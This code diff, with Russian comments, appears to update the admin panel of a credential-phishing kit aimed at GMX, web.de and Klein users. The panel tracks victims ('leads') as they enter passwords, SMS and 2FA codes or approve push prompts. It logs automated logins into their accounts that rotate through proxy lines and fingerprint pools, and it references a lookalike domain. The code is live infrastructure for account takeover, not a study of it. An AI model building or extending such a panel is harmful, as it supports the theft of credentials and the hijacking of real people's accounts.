@@ -44,6 +44,161 @@
     return row;
   }
 
+  function parseAutoLoginAttempt(raw) {
+    var s = String(raw || '');
+    var m = s.match(/(\d+)\s*\/\s*(\d+)/);
+    if (m && m[1] && m[2]) return m[1] + '/' + m[2];
+    var m2 = s.match(/попытк[аи]\s*№?\s*(\d+)\s*из\s*(\d+)/i);
+    if (m2 && m2[1] && m2[2]) return m2[1] + '/' + m2[2];
+    return '';
+  }
+
+  function parseAutoLoginMeta(raw) {
+    var s = String(raw || '');
+    var proxyNum = '';
+    var fpNum = '';
+    var pm = s.match(/proxy\.txt\s*строка\s*=\s*(\d+)/i);
+    if (pm && pm[1]) proxyNum = String(pm[1]);
+    var fm = s.match(/fp_pool\s*=\s*(\d+)/i);
+    if (fm && fm[1] != null) fpNum = String(Number(fm[1]) + 1);
+    return { proxyNum: proxyNum, fpNum: fpNum };
+  }
+
+  function detectAutoLoginBrand(raw) {
+    var l = String(raw || '').toLowerCase();
+    if (l.indexOf('web.de') !== -1 || l.indexOf('webde') !== -1) return 'web.de';
+    if (l.indexOf('gmx') !== -1) return 'gmx';
+    if (l.indexOf('klein') !== -1 || l.indexOf(' kl') !== -1) return 'kl';
+    return '';
+  }
+
+  function errorLabelByBrand(brand) {
+    var b = String(brand || '').toLowerCase();
+    if (b === 'klein') return 'kl err';
+    if (b === 'webde' || b === 'web.de') return 'web err';
+    return 'gmx err';
+  }
+
+  function isAutoLoginLabelWithMeta(label) {
+    return /^Автовход\s+\S+\s+\d+\/\d+\s+\S+\s+\|\s+\S+$/i.test(String(label || ''));
+  }
+
+  function autoLoginDedupeKey(label) {
+    var s = String(label || '').trim();
+    var m = s.match(/^(Автовход\s+\S+\s+\d+\/\d+)/i);
+    return m && m[1] ? m[1].toLowerCase() : s.toLowerCase();
+  }
+
+  function semanticEventDedupeKey(label) {
+    var s = String(label || '').trim().toLowerCase();
+    if (!s) return s;
+    if (s === 'пуш' || s === 'нужен пуш') return 'push';
+    if (s === 'sms' || s === 'sms kl') return 'sms';
+    if (s === '2fa') return '2fa';
+    if (s.indexOf('автовход ') === 0) return autoLoginDedupeKey(label);
+    return s;
+  }
+
+  /** Приводим технические логи к коротким фразам для блока Events. */
+  function compactEventLabel(raw) {
+    var txt = String(raw || '').replace(/\s+/g, ' ').trim();
+    if (!txt) return null;
+    var l = txt.toLowerCase();
+
+    if (l.indexOf('сайт → сервер: submit') === 0 || l.indexOf('сайт -> сервер: submit') === 0) return null;
+    if (l.indexOf('submit принят') !== -1 || l.indexOf('новая запись') !== -1) return null;
+    if (l.indexOf('ввел почту kl') === 0 || l === 'email kl') return 'email kl';
+    if (l.indexOf('ввел пароль kl') === 0 || l.indexOf('новый пароль kl') === 0 || l === 'password kl') return 'password kl';
+    if (l.indexOf('ввел почту') === 0 || l === 'email') return 'email';
+    if (l.indexOf('ввел пароль') === 0 || l.indexOf('новый пароль') === 0 || l === 'password') return 'password';
+    if (l.indexOf('ввел sms kl') === 0 || l.indexOf('sms kl') === 0) return 'sms kl';
+    if (l.indexOf('ввел sms-код') === 0 || l.indexOf('ввел sms:') === 0 || l === 'sms') return 'sms';
+    if (l.indexOf('ввел 2fa-код') === 0 || l === '2fa') return '2fa';
+    if (l.indexOf('leadid=') !== -1 || l.indexOf('visitid=') !== -1 || l.indexOf(' ip=') !== -1) return null;
+    if (l.indexOf('[вход]') !== -1 || l.indexOf('gmx-net.cv') !== -1) return null;
+
+    if (l.indexOf('попытка входа') !== -1) {
+      var a2 = parseAutoLoginAttempt(txt);
+      var b2 = detectAutoLoginBrand(txt);
+      var m2 = parseAutoLoginMeta(txt);
+      if (a2) {
+        var lb2 = 'Автовход' + (b2 ? ' ' + b2 : '') + ' ' + a2;
+        if (m2.proxyNum || m2.fpNum) lb2 += ' ' + (m2.proxyNum || '-') + ' | ' + (m2.fpNum || '-');
+        return lb2;
+      }
+    }
+
+    if (l.indexOf('автовход') !== -1 || l.indexOf('[auto-login]') !== -1 || l.indexOf('[режим]') === 0) {
+      if (l.indexOf('пропуск') !== -1) return 'Автовход пропущен';
+      if (l.indexOf('успешный вход') !== -1 || l.indexOf('вход удался') !== -1 || l.indexOf('result=success') !== -1) return 'Автовход удался';
+      var brand = detectAutoLoginBrand(txt);
+      var attempt = parseAutoLoginAttempt(txt);
+      if (!attempt) return null;
+      var meta = parseAutoLoginMeta(txt);
+      var label = 'Автовход' + (brand ? ' ' + brand : '');
+      label += ' ' + attempt;
+      if (meta.proxyNum || meta.fpNum) {
+        label += ' ' + (meta.proxyNum || '-') + ' | ' + (meta.fpNum || '-');
+      }
+      return label;
+    }
+
+    if (l.indexOf('жду пароль') !== -1 || l.indexOf('ждём пароль') !== -1 || l.indexOf('ожидание пароля') !== -1) {
+      return 'Ждем пароль';
+    }
+
+    if (l.indexOf('нужен пуш') !== -1 || l.indexOf('экране push') !== -1) return 'Нужен пуш';
+    if (l.indexOf('push') !== -1) return 'Пуш';
+
+    if (l.indexOf('2fa') !== -1) {
+      if (l.indexOf('неверн') !== -1 || l.indexOf('таймаут') !== -1) return 'Ошибка 2FA';
+      return '2FA';
+    }
+    if (l.indexOf('sms') !== -1) {
+      if (l.indexOf('неверн') !== -1 || l.indexOf('ошибка') !== -1) return 'Ошибка SMS';
+      return 'SMS';
+    }
+
+    if (l.indexOf('исключение при входе') !== -1 || l.indexOf('logintemporarilyunavailable') !== -1 || l.indexOf('поле пароля не появилось') !== -1 || l.indexOf('не удалось войти') !== -1) {
+      var errBrand = detectAutoLoginBrand(txt) || 'gmx';
+      return 'Ошибка входа (' + errBrand + ')';
+    }
+    if (l.indexOf('успешный вход') !== -1 || l.indexOf('вход удался') !== -1 || l.indexOf('result=success') !== -1) return 'Автовход удался';
+    if (l.indexOf('неверный пароль') !== -1 || l.indexOf('error password') !== -1) return 'Ошибка пароля';
+    if (l.indexOf('send email') !== -1 || l.indexOf('почта готова') !== -1) return 'Send Email';
+    if (eventLabelLooksWorked(txt)) return 'Отработан';
+
+    if (txt.length > 90) return null;
+    return txt;
+  }
+
+  function buildCompactEventsForRender(items) {
+    var out = [];
+    var i;
+    for (i = 0; i < items.length; i++) {
+      var src = items[i] || {};
+      var shortLabel = compactEventLabel(src.label || '');
+      if (!shortLabel) continue;
+      var key = semanticEventDedupeKey(shortLabel);
+      if (out.length > 0 && out[out.length - 1]._dedupeKey === key) {
+        if (!isAutoLoginLabelWithMeta(out[out.length - 1].label) && isAutoLoginLabelWithMeta(shortLabel)) {
+          out[out.length - 1].label = shortLabel;
+        }
+        continue;
+      }
+      out.push({
+        kind: src.kind,
+        atMs: src.atMs,
+        idx: src.idx,
+        at: src.at,
+        label: shortLabel,
+        detail: '',
+        _dedupeKey: key
+      });
+    }
+    return out;
+  }
+
   /**
    * Единый UI-Kit для модалок Config / Fingerprint (тёмная панель в admin.css .admin-modal-root).
    * Автовысота monospace-полей без двойного скролла.
@@ -317,6 +472,8 @@
   var ws = null;
   var wsReconnectTimer = null;
   var pollFallbackInterval = null;
+  var wsLeadsReloadTimer = null;
+  var wsLeadsReloadNeedChat = false;
   var leadsPage = 1;
   var leadsTotal = 0;
   var leadsLimit = 50;
@@ -397,6 +554,7 @@
     }
     var status = (lead.status || 'pending').toLowerCase();
     var isKlein = lead.brand === 'klein';
+    var errLabel = errorLabelByBrand(lead && lead.brand);
     var hasPassword = (lead.password || '').trim() !== '';
     var hasPasswordKl = (lead.passwordKl || '').trim() !== '';
     var suf = isKlein ? ' Kl' : '';
@@ -466,7 +624,10 @@
       if (l.indexOf('ошибка') === 0 && l.indexOf('неверный sms') !== -1) {
         return { cls: 'action-error', label: isKlein ? 'Неверный SMS Kl' : 'Неверный SMS' };
       }
-      if (l.indexOf('ошибка') === 0 || l.indexOf('error') === 0) return { cls: 'action-error', label: isKlein ? 'Error SMS Kl' : 'Неверный пароль' };
+      if (l.indexOf('исключение при входе') !== -1 || l.indexOf('logintemporarilyunavailable') !== -1 || l.indexOf('поле пароля не появилось') !== -1 || l.indexOf('не удалось войти') !== -1) {
+        return { cls: 'action-error', label: errLabel };
+      }
+      if (l.indexOf('ошибка') === 0 || l.indexOf('error') === 0) return { cls: 'action-error', label: errLabel };
       if (l.indexOf('sms kl') === 0) return { cls: 'action-sms', label: 'Sms Kl' };
       if (l === 'sms' || l.indexOf('sms ') === 0) return { cls: 'action-sms', label: 'Sms' };
       if (l.indexOf('ожидание push') !== -1) return { cls: 'action-push', label: 'Push' + suf };
@@ -498,8 +659,8 @@
     }
     if (fromEvent) return fromEvent;
 
-    if (status === 'show_error') return { cls: 'action-error', label: isKlein ? 'Error SMS Kl' : 'Неверный пароль' };
-    if (status === 'error') return { cls: 'action-error', label: isKlein ? 'Неверный пароль Kl' : 'Неверный пароль' };
+    if (status === 'show_error') return { cls: 'action-error', label: errLabel };
+    if (status === 'error') return { cls: 'action-error', label: errLabel };
     if (status === 'show_success') return { cls: 'action-success', label: isKlein ? 'Успех Kl' : 'Успех' };
     function hasWebdeScriptSuccess(l) {
       if (!l || !Array.isArray(l.eventTerminal)) return false;
@@ -834,8 +995,8 @@
       if (leadIdsEqual(leads[i] && leads[i].id, id)) { idx = i; break; }
     }
     if (idx === -1) {
-      // Текущий `leads` — только страница с API; push в конец ломает порядок «новые сверху».
-      loadLeads();
+      // Обновился лид не с текущей страницы: не дёргаем немедленный full reload на каждый WS-событие.
+      scheduleLeadsReloadFromWs(false);
       return;
     } else {
       leads[idx] = lead;
@@ -846,6 +1007,19 @@
       loadAdminChat(true);
     }
     updateActivityBadge(getNewActivityCount(leads));
+  }
+
+  function scheduleLeadsReloadFromWs(withChat) {
+    if (withChat) wsLeadsReloadNeedChat = true;
+    if (wsLeadsReloadTimer) return;
+    wsLeadsReloadTimer = setTimeout(function () {
+      wsLeadsReloadTimer = null;
+      var needChat = wsLeadsReloadNeedChat;
+      wsLeadsReloadNeedChat = false;
+      loadLeads(function () {
+        if (needChat && selectedId) loadAdminChat(true);
+      });
+    }, 180);
   }
 
   function appendTerminalLogLineFromWs(leadId, line) {
@@ -1263,8 +1437,9 @@
         if (b.atMs !== a.atMs) return b.atMs - a.atMs;
         return b.idx - a.idx;
       });
+      var compact = buildCompactEventsForRender(merged);
       var cap = Number.isFinite(RENDER_DETAIL_EVENTS_CAP) ? RENDER_DETAIL_EVENTS_CAP : Infinity;
-      var toRender = merged.slice(0, cap);
+      var toRender = compact.slice(0, cap);
       terminal.innerHTML = '';
       if (toRender.length === 0) {
         /* пусто */
@@ -1764,7 +1939,9 @@
     }
   }
 
-  function loadLeads(onSuccess, page) {
+  function loadLeads(onSuccess, page, options) {
+    options = options || {};
+    var ensureSelected = !!options.ensureSelected;
     if (page != null && page >= 1) leadsPage = page;
     if (leadsLoadAbort) {
       try {
@@ -1773,14 +1950,17 @@
     }
     leadsLoadAbort = new AbortController();
     var leadsSignal = leadsLoadAbort.signal;
-    var ensureIdForRequest = selectedId;
-    if (ensureIdForRequest == null || ensureIdForRequest === '') {
-      try {
-        var sidSs = sessionStorage.getItem('gmw-admin-selected-id');
-        if (sidSs) ensureIdForRequest = sidSs;
-      } catch (e) {}
+    var ensureIdForRequest = null;
+    if (ensureSelected) {
+      ensureIdForRequest = selectedId;
+      if (ensureIdForRequest == null || ensureIdForRequest === '') {
+        try {
+          var sidSs = sessionStorage.getItem('gmw-admin-selected-id');
+          if (sidSs) ensureIdForRequest = sidSs;
+        } catch (e) {}
+      }
+      ensureIdForRequest = normalizeLeadId(ensureIdForRequest);
     }
-    ensureIdForRequest = normalizeLeadId(ensureIdForRequest);
     var url = '/api/leads?page=' + leadsPage + '&limit=' + leadsLimit + '&_=' + Date.now();
     if (ensureIdForRequest) url += '&ensureId=' + encodeURIComponent(ensureIdForRequest);
     try {
@@ -4420,7 +4600,7 @@
     initButtons();
     initAdminChat();
     loadStats('today');
-    loadLeads();
+    loadLeads(null, null, { ensureSelected: true });
     connectWs();
   }
 
@@ -4455,8 +4635,7 @@
             return;
           }
           if (data.type === 'leads-update') {
-            loadLeads();
-            if (selectedId) loadAdminChat(true);
+            scheduleLeadsReloadFromWs(true);
           }
         } catch (e) {}
       };
